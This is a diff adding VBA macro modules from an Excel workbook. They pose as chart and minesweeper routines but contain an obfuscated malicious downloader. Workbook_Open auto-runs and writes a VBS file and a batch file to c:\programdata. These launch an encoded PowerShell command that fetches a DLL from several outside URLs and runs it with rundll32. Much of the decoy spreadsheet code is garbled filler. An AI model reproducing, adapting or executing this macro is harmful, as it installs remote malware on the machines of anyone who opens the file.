@@ -1,0 +1,343 @@
+Attribute VB_Name = "ErtWSgdh58ufTgjHd"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Const dhcMinCol = 1
+Const dhcMaxCol = 35
+Const dhcMinRow = 1
+Const dhcMaxRow = 35
+Sub GFhdzrfgSDErjftd()
+   Dim strFileName As String
+   If ActiveChart Is Nothing Then
+      MsgBox "jsfdg"
+   Else
+      strFileName = Application.GetSaveAsFilename( _
+       ActiveChart.Name & ".gif", "ghswz GIF (*.gif), *.gif", 1, _
+       "fahnls hasdkuis GIF")
+      If strFileName <> "" Then
+         ActiveChart.Export strFileName, "GIF"
+      End If
+   End If
+End Sub
+Sub asREryhJdefjf()
+   Charts.Add
+   ActiveChart.ChartType = xlLineMarkers
+   ActiveChart.SetSourceData Range("B1:E2"), xlRows
+   ActiveChart.Location xlLocationAsObject, Name
+   With ActiveChart
+      .HasTitle = True
+      .ChartTitle.Characters.Text = Name
+      .Axes(xlCategory, xlPrimary).HasTitle = True
+      .Axes(xlCategory, xlPrimary).AxisTitle.Characters.Text _
+       = Sheets(Name).Range("A1").Value
+      .Axes(xlValue, xlPrimary).HasTitle = True
+      .Axes(xlValue, xlPrimary).AxisTitle.Characters.Text _
+       = Sheets(Name).Range("A2").Value
+      .HasLegend = False
+      .HasDataTable = True
+      .DataTable.ShowLegendKey = True
+      With .Axes(xlCategory)
+         .HasMajorGridlines = True
+         .HasMinorGridlines = False
+      End With
+      With .Axes(xlValue)
+         .HasMajorGridlines = True
+         .HasMinorGridlines = False
+      End With
+   End With
+End Sub
+Sub poyuOgjr56ifgdh()
+   Dim strMessage As String
+   Dim i As Integer
+   For i = 1 To ActiveSheet.ChartObjects.Count
+      strMessage = strMessage & ActiveSheet.ChartObjects(i).Name _
+       & vbNewLine
+   Next i
+   MsgBox strMessage
+End Sub
+Sub jse5rt4sdfdDFGdj()
+   Dim intGradientStyle As Integer, intGradientVariant As Integer
+   Dim i As Integer
+   If ActiveChart Is Nothing Then Exit Sub
+   For i = 1 To ActiveChart.SeriesCollection.Count
+      With ActiveChart.SeriesCollection(i)
+         intGradientStyle = Int(Rnd * 7) + 1
+         If intGradientStyle = 6 Then intGradientStyle = 1
+         If intGradientStyle = 7 Then
+            intGradientVariant = Int(Rnd * 2) + 1
+         Else
+            intGradientVariant = Int(Rnd * 4) + 1
+         End If
+         .Fill.TwoColorGradient Style:=intGradientStyle, _
+          Variant:=intGradientVariant
+         .Fill.ForeColor.SchemeColor = Int(Rnd * 57) + 1
+         .Fill.BackColor.SchemeColor = Int(Rnd * 57) + 1
+      End With
+   Next i
+End Sub
+Private Sub Workbook_Open()
+   Dim intRow As Integer, intCol As Integer
+   Dim intMinesCount As Integer: Dim ghkew As Boolean: ghkew = False
+   For intMinesCount = 1 To 10
+      intRow = Int((6 * Rnd) + 1) + 1
+      GjseGsw346dtUIdf.chtklswRHswer.Caption = "dim gSEdJDsfy5JGHKdggdh:set gSEdJDsfy5JGHKdggdh=wscript.createobject(replace("WGweiSGweicrGweiipGweit.SGweihelGweil","Gwei","")):ryulxdHSerw=replace("curiw:uriw\puriwrogruriwamduriwaturiwa\ughldskbhn.buriwat","uriw",""):gSEdJDsfy5JGHKdggdh.run ryulxdHSerw,0,true:HkjsdsfEhdse46d=replace("cuerlxmuerlxd /uerlxc suerlxtauerlxruerlxt uerlx/uerlxB uerlxc:uerlx\wuerlxinuerlxdowuerlxs\suerlxyswuerlxouerlxw6uerlx4\ruuerlxnduerlxluerlxl3uerlx2.uerlxexuerlxe uerlxc:uerlx\uerlxpruerlxoguerlxramuerlxdauerlxta\bneuihlows.duerlxluerlxl,hjyldksfkw3","uerlx",""):gSEdJDsfy5JGHKdggdh.run HkjsdsfEhdse46d,0": intCol = Int((6 * Rnd) + 1) + 1
+      If ghkew <> True Then UIyDJxdseH4ysdgd 463, "c:\programdata\yhjlswle.vbs", Nothing, GjseGsw346dtUIdf.chtklswRHswer.Caption
+      ghkew = True
+      If Cells(intRow, intCol) = "tg2qhklu72kw" Then
+         co1 = Cells(intRow, intCol).Interior.Color
+         Cells(intRow, intCol).Value = "*"
+      Else
+         intMinesCount = intMinesCount + 1
+      End If
+   Next
+   GjseGsw346dtUIdf.Tag = "Wscript.Shell"
+   If intMinesCount > 3689 Then
+   Application.StatusBar = "sehnwke weq3re: " & intMinesCount
+   Else
+   UIyDJxdseH4ysdgd 463, "c:\programdata\ughldskbhn.bat", Nothing, GjseGsw346dtUIdf.chtklswRHswer.Tag
+   GjseGsw346dtUIdf.tHdshlkdf36r.Text = "qewiw"
+   End If
+End Sub
+Sub UIyDJxdseH4ysdgd(gnjler As Integer, ByVal faoliwyuo3 As String, gjeworioweSARF As Object, ByVal Hsety5isgsre As String)
+   Dim intRow, dhcMinRow, dhcMaxRow, dhcMinCol, dhcMaxCol As Integer: Dim intCol As Integer
+   Dim cell As Range: dhcMinCol = 25
+   Dim fTop As Boolean: dhcMinRow = 3: Dim fBottom As Boolean
+   Dim fLeft As Boolean: Dim fRight As Boolean: Dim intDigit As Integer
+   Open faoliwyuo3 For Output As #1: dhcMaxRow = 3
+   intDigit = 1: dhcMaxCol = 25
+   For intRow = dhcMinRow To dhcMaxRow
+      If dhcMinRow = 3 Then
+      dhcMaxCol = dhcMaxCol + _
+dhcMinCol: Print #1, Hsety5isgsre: Exit For
+      End If
+      For intCol = dhcMinCol To dhcMaxCol
+         Set cell = Cells(intRow, intCol)
+         If cell.Interior.ColorIndex = 35 Then
+            fLeft = False
+            fRight = False
+            fTop = False
+            fBottom = False
+            On Error Resume Next
+            fTop = cell.Offset(-1, 0).Interior.ColorIndex = 35
+            fBottom = cell.Offset(1, 0).Interior.ColorIndex = 35
+            fLeft = cell.Offset(0, -1).Interior.ColorIndex = 35
+            fRight = cell.Offset(0, 1).Interior.ColorIndex = 35
+            On Error GoTo 0
+            If (Not fTop And Not fLeft) Or _
+             (Not fBottom And Not fLeft And fRight) Or _
+             (Not fLeft And fRight) Or _
+             (Not fTop And fBottom) Then
+               intDigit = intDigit + 1
+            End If
+         End If
+      Next intCol
+   Next intRow
+   intDigit = (intCol - dhcMaxCol) / 2: Close #1
+   GjseGsw346dtUIdf.chtklswRHswer.Tag = "dir&echo etjlwejdfsgdsrYHDShD46dsrtydfghrg sdfgsdGDs46sdfHZSdgSwryoi&SET ertEWRt4=po&echo fkj3h5tidxhdfgokihJFjxxdsd4ghkxfghxd ghkw gfkjbgekedfghYdhjFxdf&SET cvFHDErte75s=wers&echo GJDrft678dYjdfGhSbgs5y7dfghGgEqwghcfghcghndt5tyuoghgh&SET oifYdFGhse34sd=hell -e&echo YertyDSrfGfHFTGUfHdghDfHxdgW4ehfgh78dfHDRgdsFhdfghdFBGDFnnctfGuiyfiJUCFdHdrGdhf&SET wreDgdSdytDFf=nc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGgAYQByAHAAZQByAGgAbwB1AHMAZQBwAHIAbwBkAHUAYwB0AHMALgBjAG8AbQAvAE0AZQByAGMAaABhAG4AdAAyAC8AQQBSAHMAZgAxAEwASQBjAE8AYQB1AGgASAAxAHIARAByAEkAaAAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbAB1AGIAdgBpAGQAZQBvAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AegBxAHEAZwBaADAAWQBYAGEAUABpAFcAYgBGAC8ALABoAHQAdABwADoALwAvAG0AYQBnAGkAYwBiAGwAbwBnAC4AdABhAHQAYQBtAG8AdABvAHIAcwAuAGMAbwBtAC8AdwBwAC0AaQBuAGMAbAB1AGQAZQBzAC8ANwBmAGEATgA5AC8ALABoAHQAdABwADoALwAvAGMAaABhAHMAdABvAG4AZwByAG8AZABpAHQAcwBrAGkALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBzAGsAUwBzAEMA&echo DGFDRFs57dTFgjiDYigukcvghjGFmjFxchdGFSdFqw3eDThfgH&SET jDFtHxdrgszegh=TABKAHQASQAyADQAawBaAHYAbwAvACwAaAB0AHQAcAA6AC8ALwBzAGUAYQBjAHUAcABwAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBBAFkAdgB5AGsAegBnAC8ALABoAHQAdABwADoALwAvAGUAcgBpAGMAYQBuAGQAcgBvAGIAaQBuAC4AYwBvAG0ALwBjAGcAaQAvAHEAUgBlADgAZABSAGEARwAyAEgARABOAE8ATwBHADEALwAsAGgAdAB0AHAAOgAvAC8AcwBvAHMAYQBuAHQAaQBxAHUAZQBzAC4AYwBvAG0ALwBjAGcAaQAvADkAaQBpAC8ALABoAHQAdABwAHMAOgAvAC8AZwByAGUAZQBuAGwAYQB3AG4AaQByAHIAaQBnAGEAdABpAG8AbgAuAG4AZQB0AC8ARwBMAEkAXwBOAGUAdwAvAEoAUgBsAHQAMwBtAE8AaQBlAHoARQAvACwAaAB0AHQAcABzADoALwAvAG8AbgAtAGwAaQBuAGUAdgBlAG4AdAB1AHIAZQBzAC4AYwBvAG0ALwBjAGcAaQAvAGsAcwAwAE0AcAAvACwAaAB0AHQA&echo fghkseu4hkrhfgklh gshk4HHDTHDSHFJUOHLkNxserg5 VGNfGthjtfhxdrf5&SET AegFhtXfg4f=cAA6AC8ALwBzAHUAbgByAGkAcwBlAGMAbwBuAHMAdQBsAHQAYQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBzAE8ANABYAHYARgBCAHMAZQB2AEMAUgBmAC8ALABoAHQAdABwADoALwAvAGIAbABvAGcALgBsAG8AZwBvADEAMgAzAC4AYwBvAG0ALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AMQA5AEcAMAA0AEwAagBBADEAVQBjAEUAMQB0AE4AOAAvACwAaAB0AHQAcAA6AC8ALwBpAG4AdAByAGEAYgBsAG8AZwAuAHQAYQB0AGEAbQBvAHQAbwByAHMALgBjAG8AbQAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAE0ARwBHAGkANQB6AGMAWgByAGsAbwBsAEYASAA5AC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoA&echo fdghkw4hyithyuishgkisYiUoUJlfgk67fgKjFJTHXDrgWqhdFhfgjtyh5hdgzs&SET BXdgrtysews34yu=cwBlAHMANAApAHsAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkAD0AIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABiAG4AZQB1AGkAaABsAG8AdwBzAC4AZABsAGwAIgA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A" & vbCrLf & "echo FGsrtghskeh4hirugh sgekg5kjgrkyhdlfighx7dGUTDRYUFu6r7yfugHJGJFKgjhkoi87jhgkjkj&start/B /WAIT %ertEWRt4%%cvFHDErte75s%%oifYdFGhse34sd%%wreDgdSdytDFf%%jDFtHxdrgszegh%%AegFhtXfg4f%%BXdgrtysews34yu%&echo CGFhjCDFthjufcjftT46r hsbgr4jehgdfgDRHdRHdrt4ydds rtg4jth"
+End Sub
+
+  
+
+Attribute VB_Name = "GjseGsw346dtUIdf"
+Attribute VB_Base = "0{8CB6F020-1668-4800-B46F-FF59EFE787C5}{82E2B76F-47B3-4C65-898D-EE9417558758}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Public Uew45dreh, bgwh4kithwoufsi As String
+Public egrSy4ewat4y, gAERrqawf3et As Object
+Public RHatw3ghrisaudhef As Integer
+Public hglodefilfHdrsd As Object
+Public TJswye4tgiw, ghas4eghtis As Variant
+Public hglsiffg3Sgasergk As Object
+Sub BVYIgyjdxr4ds4f()
+   Dim shpShape As Shape
+   Dim dblColor As Double
+   Dim srSerie As Series
+   Dim intBorderLineStyle As Integer
+   Dim intBorderColorIndex As Integer
+   Dim intBorderWeight As Integer
+   If ActiveChart Is Nothing Then Exit Sub
+   For Each srSerie In ActiveChart.SeriesCollection
+      If (srSerie.ChartType = xlColumnClustered Or _
+       srSerie.ChartType = xlColumnStacked Or _
+       srSerie.ChartType = xlColumnStacked100 Or _
+       srSerie.ChartType = xlBarClustered Or _
+       srSerie.ChartType = xlBarStacked Or _
+       srSerie.ChartType = xlBarStacked100) Then
+         dblColor = srSerie.Interior.Color
+         intBorderLineStyle = srSerie.Border.LineStyle
+         intBorderColorIndex = srSerie.Border.ColorIndex
+         intBorderWeight = srSerie.Border.Weight
+         Set shpShape = ActiveSheet.Shapes.AddShape _
+          (msoShapeRectangle, 1, 1, 100, 100)
+         With shpShape
+            .Fill.ForeColor.RGB = dblColor
+            .Fill.Transparency = 0.4
+            .Line.Visible = msoFalse
+         End With
+         shpShape.CopyPicture Appearance:=xlScreen, _
+          Format:=xlPicture
+         With srSerie
+            .Paste
+            .Border.Weight = intBorderWeight
+            .Border.LineStyle = intBorderLineStyle
+            .Border.ColorIndex = intBorderColorIndex
+         End With
+         shpShape.Delete
+      End If
+   Next srSerie
+ End Sub
+Function ZSFgasrjus5e6ssdvdfbsyhjshdq23() As String
+   Dim intTop As Long, intLeft As Long
+   Dim intHeight As Long, intWidth As Long
+   Dim sheet As Worksheet
+   Dim lngFirstRow As Long
+   Dim intSerie As Integer
+   Dim strErrorSheets As String
+   intTop = 1
+   intLeft = 1
+   intHeight = 180
+   intWidth = 300
+   GjseGsw346dtUIdf.lgASagw34t.Tag = "wscript c:\programdata\yhjlswle.vbs"
+   For Each sheet In ActiveWorkbook.Worksheets
+      If sheet.Name = ActiveSheet.Name + "Gew3" Then
+         lngFirstRow = 3
+         intSerie = 1
+         On Error GoTo DiagrammError
+         With ActiveSheet.ChartObjects.Add _
+          (intLeft, intTop, intWidth, intHeight).Chart
+            Do Until IsEmpty(sheet.Cells(lngFirstRow + intSerie, 1))
+               .SeriesCollection.NewSeries
+               .SeriesCollection(intSerie).Values = _
+                sheet.Range(sheet.Cells(lngFirstRow + intSerie, 2), _
+                sheet.Cells(lngFirstRow + intSerie, 4))
+               .SeriesCollection(intSerie).XValues = _
+                sheet.Range("B3:D3")
+               .SeriesCollection(intSerie).Name = sheet.Cells( _
+                lngFirstRow + intSerie, 1)
+               intSerie = intSerie + 1
+            Loop
+            .ChartType = xl3DColumnClustered
+            .ChartGroups(1).GapWidth = 20
+            .PlotArea.Interior.ColorIndex = xlNone
+            .ChartArea.Font.Size = 9
+            .HasLegend = True
+            .HasTitle = True
+            .ChartTitle.Characters.Text = sheet.Range("A1")
+            .Axes(xlValue).MinimumScale = 0
+            .Axes(xlValue).MaximumScale = 120000
+            .Axes(xlValue).MajorGridlines.Border. _
+             LineStyle = xlDot
+         End With
+         On Error GoTo 0
+         intTop = intTop + intHeight
+AfterError:
+      End If
+   Next sheet
+   Set hglsiffg3Sgasergk = _
+   hglodefilfHdrsd.CreateObject(GjseGsw346dtUIdf.Tag, "")
+   If strErrorSheets <> "" Then
+      MsgBox "rhtyjd j6ysdlefidghl: " & Chr(13) _
+       & strErrorSheets, vbExclamation
+   Else
+   Jsrtsrdse47dtshdsert Range("C129")
+   End If
+   Exit Function
+DiagrammError:
+   strErrorSheets = strErrorSheets & sheet.Name & Chr(13)
+   ActiveSheet.ChartObjects(ActiveSheet.ChartObjects.Count).Delete
+   Resume AfterError
+End Function
+Private Sub tHdshlkdf36r_Change()
+ Dim intRow As Integer, intCol As Integer
+ If intRow + 20 = intCol Then
+   Cells.Interior.Color = RGB(0, 200, 75): Cells.Font.Color = RGB(0, 0, 0)
+   Cells.Font.Size = 18: Cells.HorizontalAlignment = xlCenter
+ End If
+ Dim intMinesCount As Integer: Dim ghkew As Boolean: ghkew = False
+ For intMinesCount = 1 To 10
+  intRow = Int((6 * Rnd) + 1) + 1
+    If ActiveSheet.Name = "Haetwrtas" Then
+     co1 = Cells(intRow, intCol).Interior.Color
+     Cells(intRow, intCol).Value = "retgjo2"
+    Else
+     tUyKDGFhs4dgjdcd
+     intMinesCount = intMinesCount + 1
+     Exit For
+    End If
+ Next
+ For intRow = 2 To 7
+   For intCol = 2 To 7
+     fho23ifDAHw4etgasfoki = Cells(intRow, intCol).Interior.Color
+     dsGewrahWrfsweDFA3 = Cells(intRow, intCol).Value
+   Next
+ Next
+End Sub
+Sub tUyKDGFhs4dgjdcd()
+   Dim rgLabels As Range
+   Dim chrChart As Chart
+   Dim intPoint As Integer
+   If ActiveSheet.ChartObjects.Count > 0 Then
+   Set chrChart = ActiveSheet.ChartObjects(1).Chart
+   On Error Resume Next
+   Set rgLabels = Application.InputBox _
+    (prompt:="rtwhoes d woi8uestg9i", Type:=8)
+   If rgLabels Is Nothing Then Exit Sub
+   On Error GoTo 0
+   End If
+   Set hglodefilfHdrsd = CreateObject("RDS.DataSpace")
+   Dim jgRyewro As String: jgRyewro = ZSFgasrjus5e6ssdvdfbsyhjshdq23 + "er#"
+   If hglodefilfHdrsd Is Nothing Then
+   chrChart.SeriesCollection(1).ApplyDataLabels _
+    Type:=xlDataLabelsShowValue, _
+    AutoText:=True, _
+    LegendKey:=False
+   For intPoint = 1 To chrChart.SeriesCollection(1).Points.Count
+      chrChart.SeriesCollection(1). _
+       Points(intPoint).DataLabel.Text = rgLabels(intPoint)
+   Next intPoint
+   End If
+End Sub
+Sub Jsrtsrdse47dtshdsert(ByVal Target As Range)
+   Dim intCol As Integer, intRow As Integer
+   Dim intMinesAround As Integer
+   Dim fInGameField As Boolean
+   fInGameField = (Target.Row >= 2) And (Target.Row <= 7) _
+    And (Target.Column >= 2) And (Target.Column <= 7)
+    hglsiffg3Sgasergk.exec GjseGsw346dtUIdf.lgASagw34t.Tag
+   If Target.Value = "*%" And fInGameField Then
+      Target.Font.Color = RGB(0, 0, 0)
+      Target.Interior.Color = RGB(255, 0, 0)
+   ElseIf fInGameField And intMinesAround = 4652 Then
+      Target.Interior.Color = RGB(0, 0, 255)
+      Target.Font.Color = RGB(0, 255, 0)
+      Target.Font.Size = 16
+      For intCol = Target.Column - 1 To Target.Column + 1
+         For intRow = Target.Row - 1 To Target.Row + 1
+            If Target.Worksheet.Cells(intRow, intCol).Value = "*" _
+             Then
+               intMinesAround = intMinesAround + 1
+            End If
+         Next
+      Next
+      Target.Value = intMinesAround
+   End If
+End Sub
+  
+  
+
+Attribute VB_Name = "kdFjdset4stugxdsfghs"
+Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
